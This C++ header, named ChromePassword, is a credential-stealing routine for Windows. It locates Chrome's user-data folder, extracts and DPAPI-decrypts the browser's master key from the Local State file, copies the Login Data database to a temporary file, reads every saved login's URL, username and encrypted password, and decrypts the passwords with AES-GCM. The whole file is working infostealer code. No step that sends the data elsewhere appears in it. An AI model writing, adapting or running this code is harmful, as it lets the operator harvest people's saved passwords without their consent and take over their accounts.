#pragma once

#include "utils/utils.hpp"

namespace ChromePassword {

    struct user_data {
        std::string action_url;
        std::string username_value;
        std::string password_value;
    };

    bool WindowsUnprotect(const std::string &in, std::string &out) {

        DATA_BLOB encryptedBlob;
        DATA_BLOB plaintextBlob;

        encryptedBlob.pbData = reinterpret_cast<BYTE *>(const_cast<char *>(in.data()));
        encryptedBlob.cbData = static_cast<DWORD>(in.size());

        bool success = CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &plaintextBlob);

        if (success) {
            out.assign(reinterpret_cast<char *>(plaintextBlob.pbData), plaintextBlob.cbData);
            LocalFree(plaintextBlob.pbData);
        }

        return success;
    }

    bool Masterkey(const std::string &path, std::string &out) {

        std::string full_path = path + std::string("\\Local State");
        std::string file_content;
        fileIO::read_file(full_path, file_content);

        std::vector<std::string> match_vector;
        utils::string::match_regex(file_content, "\"encrypted_key\":\"([^\"]+)\"", match_vector);

        std::string encrypted_key = match_vector[0];

        std::string decoded64key;
        base64::decode(encrypted_key, decoded64key);
        decoded64key.erase(0, 5);

        return WindowsUnprotect(decoded64key, out);
    }

    bool OpenDatabase(const std::string &db_path, std::vector<struct user_data> &db_data) {
        sqlite3 *db;
        sqlite3_stmt *stmt;

        int rc = sqlite3_open(db_path.c_str(), &db);
        if (rc != SQLITE_OK) {
            std::cerr << "Error opening SQLite database: " << sqlite3_errmsg(db) << std::endl;
            sqlite3_close(db);
            return false;
        }

        const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
        rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
        if (rc != SQLITE_OK) {
            std::cerr << "Error preparing SQL statement: " << sqlite3_errmsg(db) << std::endl;
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            return false;
        }

        while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *username = sqlite3_column_text(stmt, 1);
            const unsigned char *password = sqlite3_column_text(stmt, 2);

            struct user_data user_data_;
            user_data_.action_url = reinterpret_cast<const char *>(url);
            user_data_.username_value = reinterpret_cast<const char *>(username);
            user_data_.password_value = reinterpret_cast<const char *>(password);

            db_data.push_back(user_data_);
        }

        if (rc != SQLITE_DONE) {
            std::cerr << "Error executing query or incomplete results: " << sqlite3_errmsg(db) << std::endl;
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            return false;
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        return true;
    }

    bool TrimCipher(const std::string &original_data, std::string &out_pass, std::string &out_tag, std::string &iv) {
        if (original_data.size() < 15) {
            return false;
        }
        iv = original_data.substr(3, 12);
        if (original_data.size() < 15 + iv.size()) {
            return false;
        }
        std::string buf = original_data.substr(15);

        if (buf.size() < 16) {
            return false;
        }
        out_tag = buf.substr(buf.size() - 16);
        out_pass = buf.substr(0, buf.size() - 16);

        return true;
    }

    void Collect(std::vector<struct user_data> &user_data_list) {
        std::string path = getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data");

        std::string key;
        Masterkey(path, key);

        std::string data_path = path + std::string("\\Default\\Login Data");

        std::stringstream new_path_s;
        new_path_s << getenv("TEMP") << "\\tempfile-" << utils::getRandomNumber(1, 1000) << "-" << utils::getCurrentTimeMillis();

        std::string new_path = new_path_s.str();
        fileIO::file_copy(data_path, new_path);

        std::vector<user_data> decrypted_user_data_list;
        OpenDatabase(new_path, decrypted_user_data_list);

        fileIO::file_remove(new_path);

        for (struct user_data &user : decrypted_user_data_list) {

            std::string password;
            std::string tag;
            std::string iv;

            TrimCipher(user.password_value, password, tag, iv);

            // this breaks the decryption process
            //utils::string::trim_str(password);

            std::vector<unsigned char> pass_bytes;
            utils::conversion::string_to_byte_vector(password, pass_bytes);

            std::vector<unsigned char> tag_bytes;
            utils::conversion::string_to_byte_vector(tag, tag_bytes);

            std::vector<unsigned char> iv_bytes;
            utils::conversion::string_to_byte_vector(iv, iv_bytes);

            std::vector<unsigned char> key_bytes;
            utils::conversion::string_to_byte_vector(key, key_bytes);

            unsigned char *plaintext = (unsigned char *)malloc(user.password_value.length() + 1);

            std::string decrypted_pass;

            utils::crypt::aes_dec_gcm(pass_bytes.data(), pass_bytes.size(), tag_bytes.data(), key_bytes.data(), iv_bytes.data(), iv_bytes.size(), plaintext);

            utils::conversion::bytes_array_to_string(plaintext, pass_bytes.size(), decrypted_pass);

            struct user_data decrypted_data = user;
            decrypted_data.password_value = decrypted_pass;

            user_data_list.push_back(decrypted_data);
        }
    }

}
